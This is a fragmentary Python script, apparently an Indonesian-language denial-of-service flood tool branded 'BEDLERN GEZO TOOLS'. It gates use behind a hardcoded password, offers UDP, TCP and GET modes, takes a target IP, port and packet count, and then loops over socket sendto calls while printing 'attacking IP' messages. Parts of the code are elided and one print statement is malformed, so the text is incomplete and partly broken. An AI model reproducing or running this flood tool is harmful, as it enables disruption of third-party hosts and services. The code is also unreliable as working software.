...
import time
import os
os.system('color ' +random.choice(['B'])+ " & cls & BEDLERN GEZO TOOLS [ Enter Pass ]")
password = input("[ + ] Masukan Password Tools : ")
if password == "BedlernGezo":
...
print("""TUNGGU BEDLERN GEZO BUKA PASS""")
time.sleep(5)
os.system("clear")
print("\033[95m")
print("""
...
print("""\033[91m
   ||DONT ABUSE BRO ||
•[>>>>>>>>>>>>>>>>[ Follow My Sosmedia ]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]•
| AUTHOR : BedlernGezo#3399     |
| github : https://github.com/BedlernGezo       |
| youtube : https://youtube.com/BedlernGezo|
| Warning Jangan Abuse Kalo Ga Mau Di Blacklist |
•[>>>>>>>>>>>>>>>>[ WARNING!! BACA DI ATAS ]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]•""")
print("\033[92m")
print("""
...
print("\033[95m")
print("""                                                               
    •ADA 3 MODE PILIH SALAH SATU|•
      | UDP | TCP | GET |""")

print("\033[95m━━━[+] Masukan Nama Anda")
name = str(input("┗━━━━━━>\033[0m:"))
print("\033[31m━━━[+] Masukan Ip/Host")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[+] Masukan Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[+] Pilih Method [Udp/Tcp]")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[+] Masukan Jumlah Packet")	
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;50m Menyerang IP %s \033[95m Dan PORT %s WITH UDP"%(ip,port))
		except:
			print("\033[0;37;95m  Menyerang IP %s \033[92m Dan Port %s"%(ip,port))
